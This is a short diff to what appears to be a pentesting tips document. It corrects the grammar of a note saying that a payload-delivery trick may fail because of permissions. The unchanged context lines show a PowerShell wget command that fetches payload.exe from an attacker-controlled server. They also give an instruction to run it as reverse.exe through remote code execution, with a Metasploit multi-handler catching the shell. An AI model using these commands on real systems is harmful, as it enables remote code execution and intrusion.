@@ -16,7 +16,7 @@ command = "PowerShell -Command \"wget 'http://your_controlled_server/payload.exe
 
 Execute your payload (now called "reverse.exe") using RCE and setup a listening with msf multi-handler.
 
-*Obs: Obviously, this method cannot works well due permission conditions and so on. This is out-of-scope... it's just a tricky! :-)*
+*Obs: Obviously, this method may not work well due to permission conditions and so on. This is out-of-scope... it's just a trick! :-)*
 
 #### 2. I need to transfer files (like my payloads) between VMs/hosts
 
